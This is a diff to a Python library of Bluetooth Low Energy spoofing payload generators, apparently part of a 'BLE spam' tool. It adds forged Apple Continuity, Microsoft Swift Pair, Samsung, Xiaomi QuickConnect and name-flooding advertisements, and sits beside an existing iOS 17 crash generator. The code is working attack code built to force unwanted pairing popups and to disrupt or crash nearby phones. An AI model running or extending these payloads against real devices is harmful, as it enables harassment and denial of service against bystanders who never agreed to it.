@@ -20,6 +20,7 @@ MANUFACTURER_APPLE = 0x004C      # 76
 MANUFACTURER_MICROSOFT = 0x0006  # 6
 MANUFACTURER_SAMSUNG = 0x0075    # 117
 MANUFACTURER_TYPO = 0x00FF       # 255
+MANUFACTURER_XIAOMI = 0x038F     # 911
 
 # Google Fast Pair Service UUID
 UUID_GOOGLE_FAST_PAIR = "0000fe2c-0000-1000-8000-00805f9b34fb"
@@ -47,6 +48,14 @@ APPLE_DEVICES = {
     "Beats Studio Pro": "1720",
     "Beats Fit Pro": "1220",
     "Beats Studio Buds+": "1620",
+    "AirPods Pro 2nd Gen USB-C": "2420",
+    "AirPods 4 ANC": "2820",
+    "AirPods 4": "2920",
+    "AirPods Max USB-C": "2B20",
+    "Beats Powerbeats Pro 2": "2C20",
+    "Beats Solo 4": "2520",
+    "Beats Solo Buds": "2620",
+    "Powerbeats Fit": "2F20",
 }
 
 # Matches ContinuityActionModalAdvertisementSetGenerator.kt _nearbyActions
@@ -67,6 +76,23 @@ APPLE_ACTION_MODALS = {
     "Apple Vision Pro": "24",
     "Connect to other Device": "2F",
     "Software Update": "21",
+    "Mobile Backup": "04",
+    "Internet Relay": "07",
+    "WiFi Password": "08",
+    "Repair": "0A",
+    "Apple Pay": "0C",
+    "Developer Tools Pairing": "0E",
+    "Answered Call": "0F",
+    "Ended Call": "10",
+    "DD Ping": "11",
+    "DD Pong": "12",
+    "Companion Link Proximity": "14",
+    "Remote Management": "15",
+    "Remote Auto Fill Pong": "16",
+    "Remote Display": "17",
+    "Unlock with Apple Watch": "2E",
+    "AirDrop Sidecar": "25",
+    "Vision Pro Setup": "2C",
 }
 
 # Matches ContinuityIos17CrashAdvertisementSetGenerator.kt _nearbyActions
@@ -573,6 +599,16 @@ def microsoft_swift_pair(device_name: str = None) -> tuple:
     return MANUFACTURER_MICROSOFT, payload
 
 
+def microsoft_swift_pair_headphone(device_name: str = None) -> tuple:
+    """Microsoft Swift Pair - Headphone variant (shows headphone icon)"""
+    if device_name is None:
+        device_name = random.choice(SWIFT_PAIR_NAMES)
+    prefix = hex_to_bytes("030180D72FD2F461E4040400")
+    name_bytes = device_name.encode("utf-8")
+    payload = prefix + name_bytes
+    return MANUFACTURER_MICROSOFT, payload
+
+
 # ============================================================
 # Samsung Easy Setup Payloads
 # ============================================================
@@ -629,6 +665,23 @@ SAMSUNG_WATCHES = {
     "Silver Watch6 Cyan 44mm": "1D",
     "Black Watch6 Classic 43m": "1E",
     "Green Watch6 Classic 43m": "20",
+    "Midnight Black Watch6": "21",
+    "Black Watch5 Golf Edition": "E4",
+    "White Watch5 Gold Edition": "E5",
+    "Black Watch6 Golf Edition": "EC",
+    "Black Watch6 TB Edition": "EF",
+    "Black Galaxy Watch7 44mm": "30",
+    "Green Galaxy Watch7 44mm": "31",
+    "Cream Galaxy Watch7 40mm": "32",
+    "Green Galaxy Watch7 40mm": "33",
+    "White Galaxy Watch7 Classic": "34",
+    "Black Galaxy Watch7 Classic": "35",
+    "Titanium White Watch Ultra": "40",
+    "Titanium Black Watch Ultra": "41",
+    "Titanium Silver Watch Ultra": "42",
+    "Black Galaxy Ring": "60",
+    "Gold Galaxy Ring": "61",
+    "Silver Galaxy Ring": "62",
 }
 
 
@@ -738,6 +791,81 @@ def lovespouse_stop(device_id: str = None) -> tuple:
 
 
 # ============================================================
+# Xiaomi QuickConnect Payloads
+# ============================================================
+
+def xiaomi_quickconnect() -> tuple:
+    """Xiaomi QuickConnect - triggers popup on Xiaomi/Redmi/POCO devices"""
+    prefix = hex_to_bytes("160120")
+    random1 = random_bytes(2)
+    middle = hex_to_bytes("170A000000008850" + "11B1FF")
+    random2 = random_bytes(2)
+    suffix = hex_to_bytes("000000000000")
+    payload = prefix + random1 + middle + random2 + suffix
+    return MANUFACTURER_XIAOMI, payload
+
+
+# ============================================================
+# NameFlood Payloads
+# ============================================================
+
+NAMEFLOOD_NAMES = [
+    "Free WiFi", "AirDrop", "Keyboard", "Mouse", "TV Remote",
+    "Game Controller", "Headphones", "Speaker", "Webcam", "Printer",
+]
+
+
+def nameflood(name: str = None) -> tuple:
+    """NameFlood - BLE device name flooding with HID service UUID"""
+    if name is None:
+        name = random.choice(NAMEFLOOD_NAMES)
+    # This uses a special format - manufacturer ID 0 signals nameflood mode
+    # The actual AD structure is built by the advertiser
+    return 0, name.encode("utf-8")
+
+
+# ============================================================
+# Apple Continuity - Additional Types
+# ============================================================
+
+def apple_airdrop() -> tuple:
+    """Apple Continuity - AirDrop broadcast"""
+    # Type 0x05, length 0x12 (18 bytes)
+    payload = "0512"
+    payload += "00" * 8  # 8 zero bytes
+    payload += format(random.randint(0, 255), "02x")  # version
+    payload += random_bytes(2).hex()  # AppleID hash
+    payload += random_bytes(2).hex()  # Phone hash
+    payload += random_bytes(4).hex()  # Email hash
+    payload += "00"  # zero
+    return MANUFACTURER_APPLE, hex_to_bytes(payload)
+
+
+def apple_airplay_target() -> tuple:
+    """Apple Continuity - AirPlay Target broadcast"""
+    payload = "0906" + random_bytes(6).hex()
+    return MANUFACTURER_APPLE, hex_to_bytes(payload)
+
+
+def apple_handoff() -> tuple:
+    """Apple Continuity - Handoff broadcast"""
+    payload = "0C0E" + random_bytes(14).hex()
+    return MANUFACTURER_APPLE, hex_to_bytes(payload)
+
+
+def apple_tethering_source() -> tuple:
+    """Apple Continuity - Tethering Source (hotspot) broadcast"""
+    payload = "0E06" + random_bytes(6).hex()
+    return MANUFACTURER_APPLE, hex_to_bytes(payload)
+
+
+def apple_nearby_info() -> tuple:
+    """Apple Continuity - Nearby Info broadcast"""
+    payload = "1005" + random_bytes(5).hex()
+    return MANUFACTURER_APPLE, hex_to_bytes(payload)
+
+
+# ============================================================
 # All generators mapped
 # ============================================================
 
@@ -748,6 +876,11 @@ ALL_GENERATORS = {
     "apple_new_airtag": apple_new_airtag_popup,
     "apple_action_modal": apple_action_modal,
     "apple_ios17_crash": apple_ios17_crash,
+    "apple_airdrop": apple_airdrop,
+    "apple_airplay_target": apple_airplay_target,
+    "apple_handoff": apple_handoff,
+    "apple_tethering_source": apple_tethering_source,
+    "apple_nearby_info": apple_nearby_info,
     # Google
     "google_fast_pair": google_fast_pair,
     "google_fast_pair_debug": google_fast_pair_debug,
@@ -755,10 +888,15 @@ ALL_GENERATORS = {
     "google_fast_pair_phone_setup": google_fast_pair_phone_setup,
     # Microsoft
     "microsoft_swift_pair": microsoft_swift_pair,
+    "microsoft_swift_pair_headphone": microsoft_swift_pair_headphone,
     # Samsung
     "samsung_buds": samsung_buds,
     "samsung_watch": samsung_watch,
     # Lovespouse
     "lovespouse_play": lovespouse_play,
     "lovespouse_stop": lovespouse_stop,
+    # Xiaomi
+    "xiaomi_quickconnect": xiaomi_quickconnect,
+    # NameFlood
+    "nameflood": nameflood,
 }
